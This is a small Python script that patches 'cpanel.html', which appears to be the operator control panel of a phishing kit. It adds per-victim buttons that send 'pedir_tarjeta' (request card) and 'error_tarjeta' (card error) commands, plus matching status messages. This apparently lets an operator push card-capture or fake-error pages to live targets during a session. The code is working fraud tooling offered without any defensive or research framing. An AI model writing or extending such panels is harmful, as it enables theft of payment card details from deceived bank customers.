import re

def update_inline_script():
    with open('cpanel.html', 'r', encoding='utf-8') as f:
        content = f.read()

    # Define the new column html
    new_column = """                    <!-- ACC. TARJETA -->
                    <td>
                        <div class="action-group">
                            <button class="btn btn-blue" onclick="sendCommand('${id}', 'pedir_tarjeta')"><i class="fas fa-credit-card"></i> TARJETA</button>
                            <button class="btn btn-red" onclick="sendCommand('${id}', 'error_tarjeta')"><i class="fas fa-times-circle"></i> ERROR TJT</button>
                        </div>
                    </td>

                    <!-- ACC. AMIVEN -->"""

    # If it's not already in there
    if "<!-- ACC. TARJETA -->" not in content:
        content = content.replace("<!-- ACC. AMIVEN -->", new_column)

    # Add the estadoMsg
    new_estado = """if (actionStr === 'pedir_tarjeta') estadoMsg = "Pidiendo Tarjeta";
            if (actionStr === 'error_tarjeta') estadoMsg = "Error en Tarjeta";
            if (actionStr === 'inicio')"""
    if "Pidiendo Tarjeta" not in content:
        content = content.replace("if (actionStr === 'inicio')", new_estado)

    with open('cpanel.html', 'w', encoding='utf-8') as f:
        f.write(content)
    
    print("Fixed cpanel.html inline script")

if __name__ == "__main__":
    update_inline_script()
